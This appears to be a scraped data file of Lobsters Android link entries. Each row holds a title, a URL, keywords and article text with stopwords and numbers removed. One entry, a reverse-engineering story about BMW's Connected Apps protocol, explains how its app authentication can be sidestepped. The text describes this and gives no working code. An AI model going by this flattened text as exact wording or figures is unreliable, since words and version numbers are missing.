service improvement callscreening apps help user apps get incoming call stirshaken verification status part call detail customize systemprovided post call screen let user perform action marking call spam adding contact wifi suggestion api enhancement extended wifi suggestion api give connectivity management apps greater ability manage network example force disconnection removing network suggestion manage passpoint network receive information quality connected network management change passpoint enhancement android enforces notifies expiration date passpoint profile support common name specification profile allows selfsigned private ca passpoint profile connectivity apps use wifi suggestion api manage passpoint network image camera improvement heif animated drawables imagedecoder api let decode render image sequence animation stored heif file make use highquality asset minimizing impact network data apk size heif image sequence offer drastic filesize reduction image sequence compared animated gifs developer display heif image sequence apps calling decodedrawable heif source source contains sequence image animatedimagedrawable returned native image decoder new ndk apis let apps decode encode image jpeg png webp native code graphic post processing retaining smaller apk size since need bundle external library native decoder also take advantage android process ongoing platform security update see ndk sample code example muting camera capture apps use new apis mute vibration ringtones alarm notification session active bokeh mode apps use metadata tag enable bokeh mode camera capture request device support still image mode offer highest quality capture continuous mode ensures capture keep sensor output video capture low latency lowlatency video decoding mediacodec low latency video critical realtime video streaming apps service like stadium video codecs support low latency playback return first frame stream quickly possible decoding start apps use new apis check configure lowlatency playback specific codec hdmi lowlatency mode apps use new apis check request auto low latency mode also known game mode external display tv mode display tv disables graphic postprocessing order minimize latency get started android developer preview everything need try android feature test apps give u feedback get started download flash device system image pixel xl pixel xl pixel xl pixel xl device additionally set android emulator android studio android emulator running android system image includes experimental support run arm binary app code directly android emulator system image lastly broader testing gsi image also available next update android studio environment android preview sdk tool inside android studio see setup guide complete detail take advantage latest android studio feature recommend installing latest version android studio canary channel set thing try new feature apis feedback critical early part developer preview actively looking input new apis still time use make change new check api overview api reference diff report please let u know feedback request soon possible test current app compatibility goal learn whether app affected default behavior change android install current published app onto device emulator test app flow find issue recommend updating app soon test app optin change like previous release android optin behavior change affect app targeting new platform extremely important understand ass change early make easier ass impact toggle change individually test please make sure let u know change working app information visit android developer site find overview new release detail behavior change setup migration guide release note feedback channel preview update plan update preview system image sdk regularly throughout android release cycle initial preview release developer intended daily consumer use making available manual download flash downloads instruction get closer final product inviting consumer try well open enrollment android beta time stay tuned detail please note android beta currently available android give u feedback always feedback crucial please let u know think sooner hear feedback integrate timeline giving priority input receive next several week find issue please report
55,Lobsters,android,Android,Detecting Memory Corruption Bugs With HWASan,https://android-developers.googleblog.com/2020/02/detecting-memory-corruption-bugs-with-hwasan.html,detecting memory corruption bug hwasan,high critical security bug address sanitizer hood memory tagging top byte ignore kernel support usage http developerandroidcomndkguideshwasan aosp build server build web flash tool,posted evgenii stepanov staff software engineer dynamic tool native code memoryunsafe language like c c often vulnerable memory corruption bug data show issue like useafterfree doublefree heap buffer overflow generally constitute high critical security bug chrome android previous year memory bug detection effort focused address sanitizer asan asan catch error cause app use extra memory run slower better tackle problem developed hardwareassisted address sanitizer hwasan hwasan typically requires memory also lot faster asan hwasan performance make usable unit testing also interactive humandriven testing use find memory issue android o made easy app developer use hwasan fast enough android developer use development device everyday task hood hwasan based memory tagging depends top byte ignore feature present arm cpu associated kernel support every memory allocation assigned random tag stored significant byte msb address ignored cpu result tagged pointer used place regular pointer without code change hood hwasan us shadow memory sparse map assigns tag value byte block program memory compile time code instrumentation used insert check compare pointer memory tag every memory access raise error match approach allows u detect useafterfree bufferoverflow type bug memory tag shadow changed random value allocation deallocation result attempting access deallocated memory dangling pointer almost certainly fail due tag mismatch true attempt access memory outside allocated region likely different tag stack global variable similarly protected useafterfree bug detection memory tagging approach non deterministic limited number possible tag invalid memory access chance approximately pas undetected observed problem practice due tag randomness running program second time likely find bug first run missed advantage hwasan asan ability find bug happen far origination point example useafterfree memory accessed long deallocated buffer overflow large offset case asan us red zone around memory allocation quarantine temporary storage recently deallocated memory block redzones quarantine limited size error detection unlikely beyond hwasan us different approach limitation usage bug discovered process terminated crash dump printed logcat abort message field contains hwasan report show access type read write access address thread id stack trace bad memory access followed stack trace original allocation useafterfree bug stack trace showing deallocation took place advanced user find extra debugging information including map memory tag nearby location signal sigabrt code siqueue fault addr abort message hwaddresssanitizer tagmismatch address pc write size tag ptrmem thread located byte right region allocated example snippet hwasan crash report google us hwasan extensively android development find including detail rebuild app use hwasan http developerandroidcomndkguideshwasan prebuilt hwasan system image available aosp build server build easily flashed onto compatible device using recently announced web flash tool
56,Lobsters,android,Android,Instant-appifying a large mature app,https://engineering.q42.nl/instant-app/,instantappifying large mature app,postnl android instant app mature app biweekly free afternoon dagger creating instant app custom url scheme exported start screen first instant deploy switching dynamic feature module intermodule navigation instruction dagger dynamic feature module blogpost written colleague frank result http,developing maintaining parcel tracking app dutch postal company postnl u app seemed perfect fit android instant app instant apps open clicking link android device taking away hurdle installing app offering nativelike experience nonetheless instant apps increase engagement end user boost installs actual app creating postnl instant app able grow amount installs whopping article explain achieved hurdle encountered adding instant app fiveyearold codebasea mature appmost user enter postnl app link email point detail parcel delivery mobile website user see large banner prompting install app instant app though could skip detour get user real app right away therefore secretly started tinkering biweekly free afternoon convinced product owner prototype instant app worth investing inat time started postnl app already five year old like many apps consisted single module named app app mb time way larger mb limit google allows instant apps wanted create instant app clear split single module able ship part instant app since entire app one module everything set way every class access every class best practice like using service interface dependency injection absent service accessed referring static instance contained service object like code override fun oncreate savedinstancestate bundle val shipment appinstancemailboxservicegetshipment way accessing service heavily used codebase since assume every service always available multimodule setup needed form resolving service decided first step needed implement dependency injection using daggerdaggerwe began creating service module contained service app would use would injected depending part app using daggerafter dagger integration able move theme activity fragment superclass style base module done reuse generic component feature modulesfrom could also separate called shipmentdetail screen feature shipment detail part app primary feature want expose instant app finally ended module dependency setup like primary use module follows service contains communication apibase contains application class well android view code like theme stylesshipmentdetail contains logic viewing single shipment ie feature want enable instant appfeatures contains rest logic appinstalled wire navigation module together used installed regular appinstant empty shell referencing module wanted include instant app working yet preparation next stepwithin four week single developer entire app refactored modular design ready deploy considering amount legacy code quite happy result time took u get deployable tested build decided focus first getting regular app stable could work regular feature therefore releasing major refactorrearchitecture quickly importantthe release diff looked like thorough regression test confident releasing change sure actively monitored crashlytics release focussed creating instant app itselfcreating instant appafter released refactored modular app could start creating specific screen instant app quite straightforward interesting part journey already ui wanted instant app regular app moved feature module named shipmentdetail adjusted ui little bit using instantappsisinstantapp context checkwe run problem thing worth mentioning article tell differentiate instant installed app thing good know creating instant appcustom url schemeyour instant enabled module include intent filter contain custom scheme url url like myawesomeapp myfeature allowed web url http allowedexportedif want super awesome upgrade flow instant app installed app make activity contain download button exported true androidmanifestxml way android start intent installation process app take therestart screenevery instant app need start screen since use case shipment tracking screen really know use home screen launcher save instant app well come back later apps vimeo news apps similar use case detail screen solve screen show new video article course ended building specific screen instant app info parcel tracking service upgrade button shipment search feature borrowed full app function home screen reckon lot user ever see screen therethe first instant deploy ready deploy instant app already worked internal test track matter promoting production surprise got prompted following checked everything dozen time find issue raised ticket google play support quite time email explaining situation response basically team trained provide technical support app development question long postnl approached unrelated offer google reach offer personalized review feature might help grow google play decided ask department help instant app deployment issue another three month sending manifest file back forward without result decided start using dynamic feature module android app bundle switching dynamic feature modulessince app bundle combine instant app together regular app sounded related deployment process app bundle would enable u deploy one build would decrease total size app alone already worth u app already divided module using dagger injection migrating dynamic feature surely issue right well exactly dynamic feature dependency tree differs intermodule communication installed module obsolete also dependency injection would need reworkedto illustrate new module dependency graph main goal module remained former base module renamed app make thing clearintermodule navigationour setup became easier case navigate feature module since explicit reference module way start intent referencing activity class directly resolve decided create navigation sealed class app module typed navigation module look like sealed class navigation class shipmentdetail myshipment shipment navigation override fun getintent intent return intent setclassname buildconfigapplicationid comexampleshipmentdetailactivity apply putextra shipment myshipment code resides app module available dynamic feature module hold explicit reference activity class little brittle made possible navigate module using little code navigationshipmentdetail shipment getintent currently google working better way perform navigation dynamic feature current alpha version nt stable enough use production check instruction informationdagger dynamic feature moduleswe adjust dagger setup appcomponent resides app module every dagger module feature depends upon see implement read blogpost written colleague frank videoseamless flow opening postnl instant app downloading full appresultsit took u almost year go idea production fair point feared instant app would never see light day challenging part migration dealing error google play store finding receiving retrospect glad able perform transition large mature app taking initiative learned lot besides everyday work able enjoy benefit modern architecture setup benefit transition u developer way better apparchitecturewe since able easily implement demand dynamic feature moduleswe actually understand daggerthe app lot smallerdeveloper compile time shorterbut result best shown usage four month instant app resulted increase user installed version app developer love take initiative like building instant app check android job vacancy dutch http
57,Lobsters,android,Android,"OpenPush - A Free, Decentralized Push Messaging Framework for Android",https://f-droid.org/en/2020/02/03/openpush-talk.html,openpush free decentralized push messaging framework android,openpush fosdem,push message essential part connected mobile device also one critical missing piece open source android ecosystem free android apps would either need implement push notification system without push messaging use proprietary google cloud messaging service expect long battery life instant notification mobile device implementing mobile push functionality usually optimize either goal especially true user running multiple application come persistent ongoing connection push notification wanting combat battery drain associated maintaining multiple connection google introduced google cloud messaging gcm framework recently become firebase cloud messaging fcm firebase cloud messaging relies availability proprietary google play service framework android device using fcm also requires inclusion proprietary fcm client library open source android apps like signal wire even firefox make effectively nonfree software distributed via fully free fdroid software repository additionally push notification delivered via fcm need pas server leaving metadata trace even empty wakeup event content message encrypted decentralized selfhosted system like matrix nextcloud rocketchat currently still dependency infrastructure term service delivering push notification fdroid version apps need fall back inefficient polling even lack support notification openpush selfhosted free alternative push messaging implementation either run alongside replacement fcm openpush presented fosdem talk give general architecture overview well walk design implementation challenge push messaging service
58,Lobsters,android,Android,"Discovering Exodus Privacy, a nice analysis tools and report DB for android app",https://exodus-privacy.eu.org/en/page/what/,discovering exodus privacy nice analysis tool report db android app,exodus privacy εxodus privacy auditing platform android application εxodus website etip github project εxodus android application list application installed mobile phone fdroid google play εxodus platform contain tracker popularization support,exodus privacy εxodus privacy auditing platform android application εxodus analyzes android application order list embedded tracker tracker piece software meant collect data usage εxodus report tell ingredient cake εxodus decompile application analysis technic legal εxodus website allows overview report report tell tracker embedded application clicking tracker name redirected detail tracker list application using tracker description empty inaccurate feel free refer etip project overview detected tracker list report also give list permission application requires correctly operate smartphone permission tagged dangerous mean google point vue application bad thing using permission εxodus us google permission classification overview permission list curious want help u improve εxodus file issue submit improvement github project εxodus android application application meant list application installed mobile phone google play fdroid tell tracker embedded application application available fdroid google play overview εxodus android application overview εxodus android application application analyze installed application smartphone retrieves report available εxodus platform contain tracker popularization support exodus privacy main interest make people aware tracking done mobile application creating video explaining tracking massively occurs smartphones video available platform also animate social network account
59,Lobsters,android,Android,Repurposing an old Android phone as a Ruby web server,https://lbrito1.github.io/blog/2020/02/repurposing-android.html,repurposing old android phone ruby web server,discarding phone every couple year install termux set ssh several way dropbear run android run android bonus point set static ip address android install ruby bundler sinatra puma neat tutorial use webrick run android install nginx run android gist set port forwarding configure dynamic dns noip hello world siege epilogue safety mr robot,ccby carlos varela http old android phone sure mindblowing amount electronic waste kind average person developed country discarding phone every couple year discarded smartphones probably one common form ewaste old motorola cedric gathering dust decided something running puma web server simple sinatra webapp going might thinking real practical use old android phone probably going stellar performance neither honestly yet deploy real code android even cheaper older phone commonly quadcore even octacore cpu least ram least theory phone close ballpark least modest cloud iaa offer instance course phone arm processor iaa usually memory management entirely different well still talking ballpark estimate anyway short tutorial repurpose android device web server number different thing really install termux first need linux environment phone termux terminal emulator linux environment android available google play store additional configuration needed installation set ssh want type lot command tiny touchscreen let set ssh log termux remotely several way found easiest way software called dropbear run android pkg upgrade pkg install dropbear use passwordbased authentication public key authentication use keybased authentication testing purpose passwordbased easiest run android run android passwd new password retype new password new password successfully set bonus point install terminal multiplexer like tmux screen make life much easier running stuff via ssh go ahead test connection desktop ssh androidipaddress p set static ip address android go wifi setting disable dhcp assign ip address phone necessary router assign new ip address phone every hoursdays would make configuration lot harder install ruby bundler sinatra puma sinatra lightweight web application framework puma web server ruby well ruby course sinatra puma suggestion could even use fullblown rail phone described neat tutorial use webrick default rail web server development singleprocess singlethreaded thus suitable production environment fine small experiment though run android pkg install ruby gem install sinatra puma install nginx nginx web server reverseproxy load balancer although useful multiserver setup used distribute request among different instance nginx also good idea setup embedded ddos protection static file serving provides run android slightly tricky part configuring nginx work puma gist pretty good start copy paste nginxconf change appdir webapp root dir case example would datadatacomtermuxfileshomeandroidsinatra set port forwarding probably want web server accessible internet set port forwarding router redirect incoming request public ip address brand new android web server exactly varies depending router pretty good tutorial get started configure dynamic dns people dynamic public ip address case useful set dynamic dns ddns service provides static domain name redirects automatically whatever public ip address moment free service provide ddns nowadays using noip okay far renew domain every month though setting ddns configure router well periodically notifies ddns service current ip address exactly depends router model hello world puma nginx running motorola siege simulate realworld usage siege http load testing software screenshot siege running setup concurrent user real test would use bigger number siege running foreground nginx log top remote android running background terminal number screenshot matter much webapp serving simple response timestamp enough least know server handle concurrent user epilogue safety watched mr robot know internet dangerous place lot true web server open internet within hour opening server already crawled sort thing innocuous indexing robot definitively nice like two request request seem fine two red probably kind attack headline keep software updated keep eye access log maybe go nginx safety guide
60,Lobsters,android,Android,Critical Bluetooth Vulnerability in Android (CVE-2020-0022),https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/,critical bluetooth vulnerability android,latest security patch,november reported critical vulnerability affecting android bluetooth subsystem vulnerability assigned patched latest security patch february security impact follows android remote attacker within proximity silently execute arbitrary code privilege bluetooth daemon long bluetooth enabled user interaction required bluetooth mac address target device known device bluetooth mac address deduced wifi mac address vulnerability lead theft personal data could potentially used spread malware shortdistance worm android vulnerability exploitable technical reason result crash bluetooth daemon android version even older might also affected evaluated impact user strongly advised install latest available security patch february patch available yet device supported anymore try mitigate impact generic behavior rule enable bluetooth strictly necessary keep mind bluetooth enabled headphone also support wired analog audio keep device nondiscoverable discoverable enter bluetooth scanning menu nevertheless older phone might discoverable permanently soon confident patch reached end user publish technical report vulnerability including description exploit well proof concept code
61,Lobsters,android,Android,uBlock Origin available soon in new Firefox for Android Nightly,https://blog.mozilla.org/addons/2020/02/06/ublock-origin-for-firefox-android-nightly/,ublock origin available soon new firefox android nightly,intention support addons firefox preview moved firefox android nightly prerelease channel ublock origin firefox preview nightly firefox android nightly recommended extension,last fall announced intention support addons mozilla reinvented firefox android browser new highperformance browser android rebuilt ground using geckoview mozilla mobile browser engine available early testing firefox preview week ago firefox preview moved firefox android nightly prerelease channel starting new chapter firefox experience android next week ublock origin first addon become available new firefox android currently available firefox preview nightly soon available firefox android nightly one popular extension recommended extension program ublock origin help million user gain control web experience blocking intrusive ad improving page load time geckoview build support webextensions apis continue enable recommended extension work new firefox android want ensure addon supported new firefox android provides exceptional secure mobile experience user end prioritizing recommended extension optimized different screen size cover common mobile use case reason possible addons previously installed firefox android supported near future addon previously installed becomes supported notify information plan support addons firefox android beyond nearterm goal post blog hope stay tuned
63,Lobsters,android,Android,A framework for building native apps with React,https://github.com/facebook/react-native,framework building native apps react,learn write anywhere react declarative componentbased developer velocity portability platform ecosystem overview content requirement expo building first react native app getting started guide documentation website react documentation facebookreactnativewebsite upgrading upgrading guide reactnativecommunityreactnativereleases contribute full text contributing guide roadmap good first issue good first issue discussion reactnativecommunitydiscussionsandproposals license license licensedocs,learn write anywhere build mobile apps react react native brings react declarative ui framework io android react native use native ui control full access native platform declarative react make painless create interactive uis declarative view make code predictable easier debug componentbased build encapsulated component manage state compose make complex uis developer velocity see local change second change javascript code live reloaded without rebuilding native app portability reuse code across io android platform react native developed supported many company individual core contributor find ecosystem overview content requirement react native apps may target io android api newer may use window macos linux development operating system though building running io apps limited macos tool like expo used work around building first react native app follow getting started guide recommended way install react native depends project find short guide common scenario documentation full documentation react native found website react native documentation discus component apis topic specific react native documentation react api shared react native react dom refer react documentation source react native documentation website hosted separate repo facebookreactnativewebsite upgrading upgrading new version react native may give access apis view developer tool goody see upgrading guide instruction react native release discussed react native community reactnativecommunityreactnativereleases contribute main purpose repository continue evolving react native core want make contributing project easy transparent possible grateful community contributing bug fix improvement read learn take part improving react native facebook adopted code conduct expect project participant adhere please read full text understand action tolerated read contributing guide learn development process propose bugfixes improvement build test change react native learn vision react native roadmap good first issue list good first issue contain bug relatively limited scope great place get started gain experience get familiar contribution process discussion larger discussion proposal discussed reactnativecommunitydiscussionsandproposals license react native mit licensed found license file react native documentation creative common licensed found licensedocs file
64,Lobsters,android,Android,A brand new browsing experience arrives in Firefox for Android Nightly,https://blog.mozilla.org/futurereleases/2020/01/17/a-brand-new-browsing-experience-arrives-in-firefox-for-android-nightly/,brand new browsing experience arrives firefox android nightly,test pilot program launch firefox preview beta june made default firefox preview beta firefox desktop come,almost year since released first firefox android hundred million user tried time provided u valuable feedback allowed u continuously improve app bringing feature user increase privacy make mobile life easier starting new chapter firefox experience android device testing meet user need back school u test stressful rather playing hanging friend adult however see value testing especially come software testing ensures roll welldesigned product wide audience deliver intended purpose firefox user heart value product provide center everything test lot make product available nightly early version developer beta version stable preview new piece software put test pilot program place sometimes enter entirely new territory add yet another layer user testing exactly spirit motivated u launch firefox preview beta june ready next step new firefox android makingof started working project wanted create better firefox android would faster reliable able address today user problem plus wanted based mobile browser engine geckoview order offer highest level privacy security available android platform short wanted make sure user would never choose privacy great browsing experience initial idea new android product would look like backed previous user research eager test see user feel find change needed make adjust accordingly minimize user disruption early version next generation browser offered early adopter separate application called firefox preview order ensure fast efficient streamlined user experience spent last couple month narrowing problem user wanted u solve iterating built surfaced feature looked closely usage behaviour user feedback determine whether previous assumption correct change would necessary feedback early adopter overwhelmingly positive firefox preview beta user loved app fresh modern look noticeably faster browsing experience due geckoview well new ui element bottom navigation bar came tracking protection learned android user prefer browsing experience strict protection le distraction made strict mode default firefox preview beta firefox desktop come standard mode firefox preview beta go nightly based previous month user testing positive feedback received confident android user appreciate new browsing experience happy announce tuesday january starting roll existing firefox android audience nightly app current nightly user feel like big exciting upgrade browsing experience update app either manually automatically depending preset update routine new user easily download firefox preview next milestone brand new firefox android go beta spring land main release later first half year meantime looking forward learning wider user group perception new firefox android well direct feedback allowing u deliver bestinclass mobile experience user deserve
65,Lobsters,android,Android,Reverse Engineering the BMW Connected Apps Protocol,https://hufman.github.io/stories/bmwconnectedapps,reverse engineering bmw connected apps protocol,excitement glitchy apps bmw ready sdk bluetooth sniffing bcl multiplexing began writing apache etch article apache etch doc apache etch symbol name etch hash algorithm rust implementation tcp connection reconstructed etch idl reconstruct etch idl fake car car authentication minimal service implementation first connection rhmi resource xml widget layout first app event rhmi whitelist component property car app implementation music app security analysis connected drive protocol car data service live cockpit,bmw joined household first taste idrive bmw connected apps magic bluetooth protocol spotify phone would added list music source dashboard clicking entry showed rich user interface offering browse option select playlist start radio station based current song far interactive basic bluetooth music control excitement immediately ignited excitement possibility instead stuck apps loaded car time manufacturer car automatically upgraded support added respective phone apps instead needing take phone pocket stare phone screen switch music use tactile controller knob infotainment screen safely control app glitchy however normal bluetooth experience smooth sometimes additional bluetooth apps protocol would nt connect sometimes individual apps would nt responsive cry help spotify forum ignored bmw connected app terrible review sign fixing anything apps additionally bmw connected android shared limited selection apps compared available apps iphone spotify iheartradio along basic calendar app since enjoy music apps called bmw support asked could get access bmw ready sdk could build apps declined decided figure bmw apps protocol add music apps system without help bluetooth sniffing hard could bluetooth standard protocol learn say car build oh hey look android builtin bluetooth capture logging record phone app saying car see find spp protocol seemed lot juicy information saw certificate xml data string look like song metadata ton stuff bcl multiplexing started noticing pattern first byte packet byte byte byte byte usually low next byte almost always figured next byte length remaining data next byte data almost always began writing wireshark lua plugin help understand data parsing first byte value named length outputting remaining byte data seems protocol used multiplex connection single bluetooth serial socket different connection id field parsed wireshark could use display filter follow individual communication flow apache etch little bit research discovered article explaining bmw us apache etch fundamental communication protocol used bmw apps quick trip apache etch doc confirms magic identifier start every etch rpc call mean decode bcl stream apache etch packet wireshark builtin etch parsing take apache etch symbol name except course apache etch compiles function name symbol name hash value wireshark use etch debug artifact replace hash value pretty name first needed figure name hash etch hash algorithm public wrote rust implementation help generate debug name artifact manually since nt original etch idl get name turn jvm bytecode android apps equivalently written easy decompile variable name obfuscated bit etch generated class contain exact list available etch symbol valuefactorybmwremotingjava private static void type hnget debmwidrivebmwremotingversioninfo b type hnget debmwidrivebmwremotingsecurityexception c type hnget debmwidrivebmwremotingserviceexception type hnget debmwidrivebmwremotingillegalargumentexception e type hnget debmwidrivebmwremotingillegalstateexception f type hnget debmwidrivebmwremotingvergetversion g type hnget debmwidrivebmwremotingresultvergetversion h type hnget debmwidrivebmwremotinginfogetsysteminfo type hnget debmwidrivebmwremotingresultinfogetsysteminfo j type hnget debmwidrivebmwremotingsascrl k type hnget debmwidrivebmwremotingresultsascrl l type hnget debmwidrivebmwremotingsascertificate type hnget debmwidrivebmwremotingresultsascertificate n type hnget debmwidrivebmwremotingsaslogin type hnget debmwidrivebmwremotingresultsaslogin run list name custom hasher give resulting file wireshark get beautiful protocol dump tcp connection decompiled code open poked around little bit connection method discovered bmw connected app run tcp localhost server proxy connection bcl multiplexed connection mean rooted phone run tcpdump record every app communication car instead running bluetooth sniffing additionally mean nt need rewrite main bmw connected app need open tcp connection magic tcp port phone get direct connection car play role bmwenabled app find port proxy running bmw connected app broadcast systemwide android intent connection detail use whenever car connection made additionally hardcoded specific port could try connect port manually completely changed approach learn talk highlevel rpc protocol reconstructed etch idl using generated etch rpc class app able reconstruct etch idl file least interesting bit wanted etch compiler happily accepted gave back proxy object even correct package layout compared example armed set etch rpc class could start poking thing fake car one first intrusive investigation technique implement server side etch rpc send connection announcement official app android intent standard way app component talk loose coupling entirely unauthenticated tricked official app module connecting etch server control instead bcl proxy car etch object stubbed notimplementedexceptions easy watch call official apps make filling much fake car needed make official app happy app running inside emulator used provided vin number download image car never physically connected first use fake car help investigate expected response authentication challenge car authentication new etch connection made app car first thing send certificate car car responds nonce app expected respond authentication data certificate signed bmw ca real way get around however cert easily available extracting file app apks main connected app includes next figure proper nonce response look long enough signature would fun try crack turn jvm bytecode easy decompile decompile entire app obfuscated java file load entire thing android studio use strong code search refactoring tool help navigate code perhaps clue found combmwgroupconnectedinternalsecuritycarsecuritymanager yes actually code clearly show us android binder rpc connect carsecurityservice object exchange challenge nonce challenge response additionally service exported app phone use quick test code verified service give back answer wireshark capture service implementation small jni wrapper around native library suspiciously contains openssl symbol fun also wrote minimal service implementation around library convenience first connection armed knowledge quickly built test app try make first connection car one first thing official apps looking packet capture call rhmigetcapabilities get list feature flag car support seemed like good first step try implement involved implementing broadcastreceiver listen car connection announcement acting client securityservice ready challenge nonce actually instantiating etch proxy object proper connection detail several trip desktop garage got successful connection rhmi resource primary goal project add music apps car attention naturally drawn rhmi namespace call enticing name like rhmisetdata rhmionactionevent one first couple call app rhmisetresource used send xml widget layout zip file resource readily available bmw app apk lending easy examination first important xml widget layout contains list component organized window list model shown component list action linked widget model hold arbitrary data phone app hold numeric id pointing resource zip file zipped resource simple graphic pack file inside named numeric id translation text pack string keyed id looking around apps different resource pack bmw mini brand first app first attempt create app car copied initialization call send remote ui resource tested rhmisetdata call try loading image car event figuring action event system pretty easy calling rhmiaddactioneventhandler signal car send input event car begin calling rhmionactionevent detail action fired action linked back originating component rhmi whitelist next experiment try edit widget layout sent car however immediately failed car rejecting upload exception uploading original artifact still worked great however looking closer found list checkums authentication cert original resource match checkums mean ca nt change widget layout graphic pack mainly problem entrybutton component hardcoded specific icon graphic pack essentially app creates rhmi app show app icon belongs original authentication cert component property initially disappointed would nt able build custom app locked original widget layout however sometimes saw call rhmisetproperty wireshark capture component widget layout property collection defined property defined numeric id could property could figure property id mean turn java bytecode really easy decompile found rhmipropertytype enum entire list even though ca nt change widget configuration set widget property including visibility position size still allows ton flexibility armed basic building block set work building music app car except already several excellent music apps phone would prefer add apps car instead writing way could instead control existing music apps turn android encourages music apps implement protocol called mediabrowserservice implementing single api app automatically becomes available android auto android wear supposedly bluetooth stack could act another client interface implement car frontend top api car app implementation strategy made implementation relatively easy needed build client mediabrowserservice whenever metadata callback happen update car label appropriate information button callback car could run command music app month polish music app full browse search support control mediabrowserservice music app security analysis another instance terrible car security letting random attacker explode car side world entirely separate connected drive protocol used hack car side world connected apps protocol function local connection phone running car usb bluetooth number security restriction place reduce chance mischief phone app log cert signed bmw however cert easily accessible extracting existing app fact official companion apps spotify host contentprovider official app fetch appspecific cert log car behalf contentprovider provides read access cert app phone authentication cert whitelist permission brand car authenticate feature unlocks section car data service access whether app creation available asset however perhaps ease development official cert pretty much wide open locking asset nicely generic layout car exchange login nonce client app sign bmw remove exported service allowed app ask answer challenge ca nt remove connected classic app play store wo nt let update without updating targeted android api level user safe running new connected app however unscrupulous attacker could include jni library generate challenge response apps sandboxed apps access information readonly car data service nt get direct canbus access new app layout hidden behind app entry button menu global state modified specific function set music metadata trigger navigation start phone call much else protocol deprecated going away bmw new live cockpit system support remote app protocol instead finally adding android auto support existing apple carplay support apps baked car apps phone wo nt able integrate way reduce mischief bmw use sandboxing experience start developer program like gm done user express creativity build apps contribute app store entire reverse engineering project started wanted add new functionality car using marvelous technology bmw provided entire car modding scene show devotion people tinkering car car increasingly softwaredriven simply next phase idea
67,Lobsters,android,Android,"Run CLion native on Android, ditch your desktop",https://raymii.org/s/blog/Run_CLion_on_Android.html,run clion native android ditch desktop,like article consider sponsoring trying digital ocean vps link get credit day referral link codewars kata write lineageos chroot easy hard termux vnc app open source well easy anlinux andronix anlinux anlinux anlinux hard htc debian wiki development tool codewars kata installing clion download clion targz file debugging unit testing googletest android blog c chroot cmake cpp development googletest icewm linux testing ttd ubuntu xfce,often read article state people replaced main computer ipad fully content many article use linux server vps somewhere native apps mostly ssh server well told run full blown ide best ide c clion jetbrains android including compiling native gcc cmake gdb stuff used fun installed clion old samsung tab lying around using ubuntu chroot work way better expected bluetooth keyboard mouse almost desktop wonder could run android studio use tablet compile app article show photo including mechanical keyboard different window manager instruction replicate setup like article consider sponsoring trying digital ocean vps link get credit day referral link job use clion editor choice c embedded developer one two prefer different tool nano home use well training codewars kata often sometimes write however always possible use big bulky workstation want mobile setup maybe laptop suit need could use one old tablet probably drawer gathering dust get hour battery life even better expected old device running jetbrains resource hungry software since clion java software thought let try get running one older tablet also bluetooth keyboard lying around perfect combo development couch train powerbank usbotg cable could even use code keyboard doenst want train every day riding work hardware consists samsung galaxy tab running custom rom lineageos generic rapoo china fluff bluetooth keyboardmouse chroot easy hard using chroot environment one install modern linux distro via easy use gui app android root required copy paste command termux start vnc server connect vnc app bvnc open source well linux distro choice easy easy way use app like anlinux andronix latter one andronix ask money use app feature nt need pay basic ubuntu installation first anlinux open source bit spartan work fine even offer icewm easy option icewm favorite legacy window manager tablet chroot us almost resource storageram know jetbrains ide use resource get first attempt used andronix work installs xfce default setup bit icon missing firefox give segfault unable run nonroot user minor annoyance distro recent though provide ubuntu screenshot xfce environment andronix provides note smoother looking text second latter attempt used anlinux offer ubuntu next xfce also icewm like screenshot clion icewm via anlinux anlinux could add regular user run firefox without segfaults gcc version provided ubuntu ubuntu preference would go anlinux due le intrusive application source code available andronix look like shady site incomplete documentation pushing premium version paid modded o version hard setup chroot android back first android phone first htc htc dream outside tmobile already ran desktop environment via chroot way boy proud openoffice running small phone screen debian wiki bunch information guide manual chroot debian work well ubuntu clion development tool ubuntu installed running gui need use package manager install development tool bundled clion version wo nt work due different architecture fire termux another terminal enter chrootvnc install basic apt install buildessential cmake gdb clangformat git wget sudo note everything work correctly due started chroot anything related systemd fail since systemd run chroot also proc default p auxf top wo nt work purpose running clion browser codewars kata nt major problem consider adding regular user run everything root le secure adduser yourusername question user information password stop vnc server restart via termux newly created user example sudo u yourusername vncserverstart installing clion installed package go ahead download clion targz file via version page avoid enter email address wget http extract file tar xf fire clion via script magical fancy splash screen greet debugging unit testing might wonder kind binary compiled case tablet arm specific architecture homeremyclionprojectsuntitledcmakebuilddebuguntitled elf lsb shared object arm version sysv dynamically linked interpreter gnulinux buildid debuginfo stripped installed gdb use via clion debug like used breakpoints watch whole shebang even googletest layout cmake project work without problem tag android blog c chroot cmake cpp development googletest icewm linux testing ttd ubuntu xfce
68,Lobsters,android,Android,Building Mobile Apps (iOS and Android) with Clojurescript,https://medium.com/mindorks/building-mobile-apps-ios-and-android-with-clojurescript-4600235f826c,building mobile apps io android clojurescript,medium github,let change background color button text shown press buttonlet reinstall app using npm run runandroideven changing code reinstalling application everything look samestill working credit giphy although made change cljfile one thing still done rebuild code update indexandroidjs file actually loaded bundlerthis figwheel come picture without need manually rebuild install application every time make change code check projectclj notice exactly happens prod profile figwheel every time build project update indexandroidjs indexiosjs lein withprofile prod cljsbuild autohowever really slow feedback cycle development therefore separate dev profile us figwheel start using figwheel run following command make sure emulator running beforehand renatal useandroiddevice renatal lein figwheel npm run runandroidusing figwheel developmentnow make change code see result realtime thank reading hope enjoyed article next part let build application scratch also follow medium github
69,Lobsters,android,Android,Twitter for Android Security Issue,https://privacy.twitter.com/en/blog,twitter android security issue,cooky use,using service agree cooky use use cooky purpose including analytics personalisation ad
